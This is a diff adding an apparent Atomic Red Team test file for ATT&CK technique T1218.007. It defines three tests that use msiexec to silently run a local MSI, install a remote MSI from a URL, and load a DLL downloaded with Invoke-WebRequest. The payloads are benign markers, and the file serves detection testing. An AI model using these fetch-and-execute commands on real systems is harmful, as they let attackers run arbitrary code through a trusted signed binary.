@@ -1,0 +1,67 @@
+attack_technique: T1218.007
+display_name: 'Signed Binary Proxy Execution: Msiexec'
+atomic_tests:
+- name: Msiexec.exe - Execute Local MSI file
+  auto_generated_guid: 0683e8f7-a27b-4b62-b7ab-dc7d4fed1df8
+  description: |
+    Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    msi_payload:
+      description: MSI file to execute
+      type: Path
+      default: PathToAtomicsFolder\T1218.007\src\Win32\T1218.msi
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1218.msi must exist on disk at specified location (#{msi_payload})
+    prereq_command: |
+      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "You must provide your own MSI"
+  executor:
+    command: |
+      msiexec.exe /q /i "#{msi_payload}"
+    name: command_prompt
+- name: Msiexec.exe - Execute Remote MSI file
+  auto_generated_guid: bde7d2fe-d049-458d-a362-abda32a7e649
+  description: |
+    Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI opens notepad.exe when sucessfully executed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    msi_payload:
+      description: MSI file to execute
+      type: String
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi
+  executor:
+    command: |
+      msiexec.exe /q /i "#{msi_payload}"
+    name: command_prompt
+- name: Msiexec.exe - Execute Arbitrary DLL
+  auto_generated_guid: 66f64bd5-7c35-4c24-953a-04ca30a0a0ec
+  description: |
+    Execute arbitrary DLL file stored locally. Commonly seen in application installation.
+    Upon execution, a window titled "Boom!" will open that says "Locked and Loaded!". For 32 bit systems change the dll_payload argument to the Win32 folder.
+    By default, if the src folder is not in place, it will download the 64 bit version.
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_payload:
+      description: DLL to execute
+      type: Path
+      default: PathToAtomicsFolder\T1218.007\src\x64\T1218.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1218.dll must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" -OutFile "#{dll_payload}"
+  executor:
+    command: |
+      msiexec.exe /y "#{dll_payload}"
+    name: command_prompt
